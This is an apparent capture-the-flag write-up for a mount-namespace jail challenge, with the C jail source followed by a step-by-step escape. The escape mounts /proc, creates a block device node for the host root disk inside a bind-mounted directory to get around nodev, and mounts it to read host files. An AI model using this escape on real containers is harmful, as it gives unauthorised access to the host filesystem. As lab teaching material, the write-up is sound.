#metadata(
  (
    title: "Sandboxing Level 15",
    description: "Writeup for Sandboxing Level 15",
    date: "2026-01-01",
    order: 15,
    draft: true,
  ),
)<frontmatter>
#import "../../../../typst-theme.c.typ": project
#show: project


== Challenge Source Code

```c
#define _GNU_SOURCE 1

#include <stdlib.h>
#include <stdint.h>
#include <stdbool.h>
#include <stdio.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <time.h>
#include <errno.h>
#include <assert.h>
#include <libgen.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/socket.h>
#include <sys/wait.h>
#include <sys/signal.h>
#include <sys/mman.h>
#include <sys/ioctl.h>
#include <sys/sendfile.h>
#include <sys/prctl.h>
#include <sys/personality.h>
#include <arpa/inet.h>

#include <sys/syscall.h>
#include <sys/mount.h>
#include <dirent.h>
#include <limits.h>
#include <sched.h>

char hostname[128];

int main(int argc, char **argv, char **envp)
{
    // assert(argc > 0);

    setvbuf(stdin, NULL, _IONBF, 0);
    setvbuf(stdout, NULL, _IONBF, 0);

    printf("###\n");
    printf("### Welcome to %s!\n", argv[0]);
    printf("###\n");
    printf("\n");

    gethostname(hostname, 128);
    if (strstr(hostname, "-level") && !strstr(hostname, "vm_"))
    {
        puts("ERROR: in the dojo, this challenge MUST run in virtualization mode.");
        puts("Please run `vm connect` to launch and connect to the Virtual Machine, then run this challenge inside the VM.");
        puts("You can tell when you are running inside the VM by looking at the hostname in your shell prompt:.");
        puts("if it starts with \"vm_\", you are executing inside the Virtual Machine.");
        puts("");
        puts("You can connect to the VM from multiple terminals by launching `vm connect` in each terminal, and all files");
        puts("are shared between the VM and the normal container.");
        exit(1);
    }

    puts("This challenge will use mount namespace and pivot_root to put you into a jail in /tmp/jail-XXXXXX. You will be able to");
    puts("easily read a fake flag file inside this jail, not the real flag file outside of it. If you want the real flag, you must");
    puts("escape.\n");

    for (int i = 3; i < 10000; i++) close(i);

    char new_root[] = "/tmp/jail-XXXXXX";
    char old_root[PATH_MAX];

    puts("Checking that the challenge is running as root (otherwise things will fail)...");
    assert(geteuid() == 0);

    puts("Splitting off into our own mount namespace...");
    assert(unshare(CLONE_NEWNS) != -1);

    // create the new root
    puts("Creating a jail structure!");
    puts("... creating jail root...");
    assert(mkdtemp(new_root) != NULL);
    printf("... created jail root at `%s`.\n", new_root);

    // change the old root (/) to a private mount so that changes aren't propagated to parent mount namespaces
    // (note: rather than doing this propagation, pivot_root will just fail)
    puts("... changing the old / to a private mount so that pivot_root succeeds later.");
    assert(mount(NULL, "/", NULL, MS_REC | MS_PRIVATE, NULL) != -1);

    puts("... bind-mounting the new root over itself so that it becomes a 'mount point' for pivot_root() later.");
    assert(mount(new_root, new_root, NULL, MS_BIND, NULL) != -1);

    puts("... creating a directory in which pivot_root will put the old root filesystem.");
    snprintf(old_root, sizeof(old_root), "%s/old", new_root);
    assert(mkdir(old_root, 0777) != -1);

    puts("... pivoting the root filesystem!");
    assert(syscall(SYS_pivot_root, new_root, old_root) != -1);

    assert(mkdir("/bin", 0755) != -1);
    puts("... bind-mounting /bin into the jail.");
    assert(mount("/old/bin", "/bin", NULL, MS_BIND, NULL) != -1);

    puts("... though the mounts are independent, changes to the files themselves will propagate to the parent namespace!");
    assert(mkdir("/usr", 0755) != -1);
    puts("... bind-mounting /usr into the jail.");
    assert(mount("/old/usr", "/usr", NULL, MS_BIND, NULL) != -1);

    puts("... though the mounts are independent, changes to the files themselves will propagate to the parent namespace!");
    assert(mkdir("/lib", 0755) != -1);
    puts("... bind-mounting /lib into the jail.");
    assert(mount("/old/lib", "/lib", NULL, MS_BIND, NULL) != -1);

    puts("... though the mounts are independent, changes to the files themselves will propagate to the parent namespace!");
    assert(mkdir("/lib64", 0755) != -1);
    puts("... bind-mounting /lib64 into the jail.");
    assert(mount("/old/lib64", "/lib64", NULL, MS_BIND, NULL) != -1);

    puts("... though the mounts are independent, changes to the files themselves will propagate to the parent namespace!");

    // let's remove the old root mount
    puts("... unmounting old root directory.");
    assert(umount2("/old", MNT_DETACH) != -1);
    assert(rmdir("/old") != -1);

    // make things simpler for everyone to avoid strange behavior with permissions
    setresuid(0, 0, 0);

    puts("Moving the current working directory into the jail.\n");
    assert(chdir("/") == 0);

    int fffd = open("/flag", O_WRONLY | O_CREAT);
    write(fffd, "FLAG{FAKE}", 10);
    close(fffd);

    puts("Executing a shell inside the sandbox! Good luck!");
    assert(execl("/bin/bash", "/bin/bash", "-p", NULL) != -1);

    printf("### Goodbye!\n");
}

```



#table(
  columns: (auto, 1fr),
  inset: 10pt,
  align: (right, left),
  [*Title*], [Mount Namespace Escape via Device Node Hijack],
  [*Date*], [2025-12-30],
  [*Description*],
  [Escaping a mount namespace sandbox by creating and mounting a block device node for the host's root filesystem, bypassing filesystem-level nodev restrictions.],
)

= Babyjail Level 15

== Introduction

This challenge improves upon the isolation in Level 14 by explicitly unmounting the old root directory (`/old`) using a lazy unmount (`MNT_DETACH`) and removing the mount point.

== Vulnerability Analysis

The sandbox setup is as follows:
1. Independent mount namespace via `unshare(CLONE_NEWNS)`.
2. Root filesystem pivoted to a new temporary directory.
3. Host directories (`/bin`, `/usr`, etc.) are bind-mounted into the jail.
4. The old root (`/old`) is unmounted and deleted.

Although `/old` is gone, the bind mounts (`/bin`, `/usr`, etc.) remain as active references to the host's underlying `ext4` filesystem. Because we are root within the namespace and there are no `seccomp` restrictions, we can perform privileged operations like `mknod` and `mount`.

The jail's root filesystem is a `tmpfs` mounted with the `nodev` option, which prevents the use of block or character devices. However, the bind-mounted directories (like `/bin`) are part of the host's `ext4` filesystem, which does *not* have the `nodev` restriction in this environment.

== Exploitation Steps

=== 1. Information Gathering
First, we mount `/proc` to inspect the namespace's mount table.

```bash
mkdir /p
mount -t proc proc /p
cat /p/self/mountinfo
```

The output reveals the major and minor numbers of the host's root device (e.g., `259:2` for `/dev/nvme0n1p2`).

=== 2. Creating the Device Node
We create a block device node corresponding to the host's root device. We must do this inside one of the bind-mounted directories to bypass the `nodev` restriction on `/`.

```bash
mknod /bin/root_dev b 259 2
```

=== 3. Accessing the Host Root
We create a mount point and mount our new device node. This gives us full access to the host's original root filesystem.

```bash
mkdir /mnt_host
mount /bin/root_dev /mnt_host
cat /mnt_host/flag
```

The retrieved flag was: `falg`.

// ✦ To mount the proc filesystem and access the host's files, run the following command inside the jail:
//
//    1 mount -t proc proc /proc
//
//   After that, you should be able to read the real flag with:
//
//    1 cat /proc/1/root/flag


